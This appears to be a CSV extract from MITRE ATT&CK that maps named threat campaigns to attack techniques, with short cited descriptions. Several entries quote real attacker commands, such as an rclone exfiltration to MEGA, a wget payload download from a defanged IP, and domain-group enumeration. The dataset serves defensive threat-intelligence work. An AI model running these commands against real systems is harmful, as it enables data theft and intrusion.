source ID,target ID,mapping description
C0040,T1586.003,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used compromised Google Workspace accounts for command and control.(Citation: Google Cloud APT41 2024)
C0040,T1553.002,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used stolen code signing certificates for [DUSTTRAP](https://attack.mitre.org/software/S1159) malware and subsequent payloads.(Citation: Google Cloud APT41 2024)
C0040,T1588.003,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used stolen code signing certificates to sign [DUSTTRAP](https://attack.mitre.org/software/S1159) malware and components.(Citation: Google Cloud APT41 2024)
C0040,T1574.001,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved the use of DLL search order hijacking to execute [DUSTTRAP](https://attack.mitre.org/software/S1159).(Citation: Google Cloud APT41 2024)
C0040,T1574.002,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used DLL side-loading to execute [DUSTTRAP](https://attack.mitre.org/software/S1159) via an AhnLab uninstaller.(Citation: Google Cloud APT41 2024)
C0040,T1027.013,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used encrypted payloads decrypted and executed in memory.(Citation: Google Cloud APT41 2024)
C0040,T1567.002,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) exfiltrated collected information to OneDrive.(Citation: Google Cloud APT41 2024)
C0040,T1070.004,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) deleted various artifacts from victim systems following use.(Citation: Google Cloud APT41 2024)
C0040,T1074.001,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved exporting data from Oracle databases to local CSV files prior to exfiltration.(Citation: Google Cloud APT41 2024)
C0040,T1036.004,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) disguised [DUSTPAN](https://attack.mitre.org/software/S1158) as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.(Citation: Google Cloud APT41 2024)
C0040,T1596.005,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used internet scan data for target development.(Citation: Google Cloud APT41 2024)
C0040,T1593.002,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved use of search engines to research victim servers.(Citation: Google Cloud APT41 2024)
C0040,T1583.007,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.(Citation: Google Cloud APT41 2024)
C0040,T1569.002,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used Windows services to execute [DUSTPAN](https://attack.mitre.org/software/S1158).(Citation: Google Cloud APT41 2024)
C0040,T1071.001,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used HTTPS for command and control.(Citation: Google Cloud APT41 2024)
C0040,T1505.003,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.(Citation: Google Cloud APT41 2024)
C0040,T1543.003,[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used Windows Services with names such as `Windows Defend` for persistence of [DUSTPAN](https://attack.mitre.org/software/S1158).(Citation: Google Cloud APT41 2024)
C0010,T1583.001,"For [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.(Citation: Mandiant UNC3890 Aug 2022)"
C0010,T1584.001,"During [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.(Citation: Mandiant UNC3890 Aug 2022)"
C0010,T1608.004,"For [C0010](https://attack.mitre.org/campaigns/C0010), the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.(Citation: Mandiant UNC3890 Aug 2022)"
C0010,T1587.001,"For [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors used unique malware, including [SUGARUSH](https://attack.mitre.org/software/S1049) and [SUGARDUMP](https://attack.mitre.org/software/S1042).(Citation: Mandiant UNC3890 Aug 2022)"
C0010,T1588.002,"For [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.(Citation: Mandiant UNC3890 Aug 2022)"
C0010,T1608.001,"For [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.(Citation: Mandiant UNC3890 Aug 2022) "
C0010,T1608.002,"For [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.(Citation: Mandiant UNC3890 Aug 2022)"
C0011,T1587.003,"For [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) established SSL certificates on the typo-squatted domains the group registered.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0011,T1583.001,"For [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) registered domains likely designed to appear relevant to student targets in India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0011,T1204.002,"During [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) relied on a student target to open a malicious document delivered via email.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0011,T1204.001,"During [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) relied on student targets to click on a malicious link sent via email.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0011,T1566.001,"During [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) sent malicious attachments via email to student targets in India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) "
C0011,T1566.002,"During [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) sent emails containing a malicious link to student targets in India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0011,T1608.001,"For [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) hosted malicious documents on domains registered by the group.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) "
C0011,T1059.005,"For [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) used malicious VBA macros within a lure document as part of the [Crimson](https://attack.mitre.org/software/S0115) malware installation process onto a compromised host.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)"
C0015,T1553.002,"For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used DLL files that had invalid certificates.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1069.002,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors use the command `net group ""domain admins"" /dom` to enumerate domain groups.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1055.001,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process.(Citation: DFIR Conti Bazar Nov 2021) "
C0015,T1567.002,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1059.007,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1074.001,"During [C0015](https://attack.mitre.org/campaigns/C0015), PowerView's file share enumeration results were stored in the file `c:\ProgramData\found_shares.txt`.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1069.001,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used the command `net localgroup ""adminstrator"" ` to identify accounts with local administrator rights.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1204.002,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors relied on users to enable macros within a malicious Microsoft Word document.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1588.001,"For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used [Cobalt Strike](https://attack.mitre.org/software/S0154) and [Conti](https://attack.mitre.org/software/S0575) ransomware.(Citation: DFIR Conti Bazar Nov 2021) "
C0015,T1218.005,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used `mshta` to execute DLLs.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1218.010,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors employed code that used `regsvr32` for execution.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1021.001,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used RDP to access specific network hosts of interest.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1218.011,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors loaded DLLs via `rundll32` using the `svchost` process.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1566.001,"For [C0015](https://attack.mitre.org/campaigns/C0015), security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1588.002,"For [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors obtained a variety of tools, including [AdFind](https://attack.mitre.org/software/S0552),  AnyDesk, and Process Hacker.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1059.005,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021)"
C0015,T1059.003,"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors used `cmd.exe` to execute commands and run malicious binaries.(Citation: DFIR Conti Bazar Nov 2021)"
C0017,T1560.003,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) hex-encoded PII data prior to exfiltration.(Citation: Mandiant APT41)"
C0017,T1102.001,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used dead drop resolvers on two separate tech community forums for their [KEYPLUG](https://attack.mitre.org/software/S1051) Windows-version backdoor; notably [APT41](https://attack.mitre.org/groups/G0096) updated the community forum posts frequently with new dead drop resolvers during the campaign.(Citation: Mandiant APT41)"
C0017,T1048.003,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.(Citation: Mandiant APT41)"
C0017,T1059.007,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) deployed JScript web shells on compromised systems.(Citation: Mandiant APT41)
"
C0017,T1074.001,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) copied the local `SAM` and `SYSTEM` Registry hives to a staging directory.(Citation: Mandiant APT41)"
C0017,T1036.004,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `SCHTASKS  /Change` to modify legitimate scheduled tasks to run malicious code.(Citation: Mandiant APT41)"
C0017,T1036.005,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used file names beginning with USERS, SYSUSER, and SYSLOG for [DEADEYE](https://attack.mitre.org/software/S1052), and changed [KEYPLUG](https://attack.mitre.org/software/S1051) file extensions from .vmp  to .upx likely to avoid hunting detections.(Citation: Mandiant APT41)"
C0017,T1001.003,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.(Citation: Mandiant APT41)"
C0017,T1053.005,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility`, `\Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`.(Citation: Mandiant APT41) "
C0017,T1003.002,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) copied the `SAM` and `SYSTEM` Registry hives for credential harvesting.(Citation: Mandiant APT41)"
C0017,T1027.002,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used VMProtect to slow the reverse engineering of malicious binaries.(Citation: Mandiant APT41)"
C0017,T1588.002,"For [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.(Citation: Mandiant APT41)"
C0017,T1071.001,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.(Citation: Mandiant APT41)
"
C0017,T1505.003,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) deployed JScript web shells through the creation of malicious ViewState objects.(Citation: Mandiant APT41)"
C0017,T1059.003,"During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `cmd.exe` to execute reconnaissance commands.(Citation: Mandiant APT41)"
C0018,T1027.010,"During [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors used Base64 to encode their PowerShell scripts.(Citation: Cisco Talos Avos Jun 2022)(Citation: Costa AvosLocker May 2022)"
C0018,T1036.005,"For [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors renamed a [Sliver](https://attack.mitre.org/software/S0633) payload to `vmware_kb.exe`.(Citation: Cisco Talos Avos Jun 2022)"
C0018,T1059.001,"During [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors used encoded PowerShell scripts for execution.(Citation: Cisco Talos Avos Jun 2022)(Citation: Costa AvosLocker May 2022)"
C0018,T1021.001,"During [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.(Citation: Costa AvosLocker May 2022)"
C0018,T1218.011,"During [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors used `rundll32` to run [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Costa AvosLocker May 2022)"
C0018,T1588.002,"For [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors acquired a variety of open source tools, including [Mimikatz](https://attack.mitre.org/software/S0002), [Sliver](https://attack.mitre.org/software/S0633), SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.(Citation: Cisco Talos Avos Jun 2022)(Citation: Costa AvosLocker May 2022)"
C0018,T1071.001,"During [C0018](https://attack.mitre.org/campaigns/C0018), the threat actors used HTTP for C2 communications.(Citation: Costa AvosLocker May 2022)"
C0021,T1573.002,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used SSL via TCP port 443 for C2 communications.(Citation: FireEye APT29 Nov 2018)"
C0021,T1027.010,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used encoded PowerShell commands.(Citation: FireEye APT29 Nov 2018)(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1583.001,"For [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors registered domains for use in C2.(Citation: FireEye APT29 Nov 2018)"
C0021,T1584.001,"For [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used legitimate but compromised domains to host malicious payloads.(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1027.009,"For [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors embedded a base64-encoded payload within a LNK file.(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1204.001,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file.(Citation: FireEye APT29 Nov 2018)"
C0021,T1059.001,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.(Citation: FireEye APT29 Nov 2018)(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1218.011,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used `rundll32.exe` to execute the [Cobalt Strike](https://attack.mitre.org/software/S0154) Beacon loader DLL.(Citation: FireEye APT29 Nov 2018)"
C0021,T1566.002,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.(Citation: FireEye APT29 Nov 2018)(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1588.002,"For [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used [Cobalt Strike](https://attack.mitre.org/software/S0154) configured with a modified variation of the publicly available Pandora Malleable C2 Profile.(Citation: FireEye APT29 Nov 2018)(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1608.001,"For [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors uploaded malware to websites under their control.(Citation: FireEye APT29 Nov 2018)(Citation: Microsoft Unidentified Dec 2018)"
C0021,T1071.001,"During [C0021](https://attack.mitre.org/campaigns/C0021), the threat actors used HTTP for some of their C2 communications.(Citation: FireEye APT29 Nov 2018)"
C0026,T1560.001,"During [C0026](https://attack.mitre.org/campaigns/C0026), the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.(Citation: Mandiant Suspected Turla Campaign February 2023)"
C0026,T1583.001,"For [C0026](https://attack.mitre.org/campaigns/C0026), the threat actors re-registered expired C2 domains previously used for [ANDROMEDA](https://attack.mitre.org/software/S1074) malware.(Citation: Mandiant Suspected Turla Campaign February 2023)"
C0027,T1098.001,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1098.003,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) used IAM manipulation to gain persistence and to assume or elevate privileges.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1087.004,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1078.004,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) leveraged compromised credentials from victim users  to authenticate to Azure tenants.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1069.003,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) accessed Azure AD to download bulk lists of group members and their Active Directory attributes.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1021.007,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
C0027,T1578.002,"During [C0027](https://attack.mitre.org/campaigns/C0027), [Scattered Spider](https://attack.mitre.org/groups/G1015) used access to the victim's Azure tenant to create Azure VMs.(Citation: Crowdstrike TELCO BPO Campaign December 2022)"
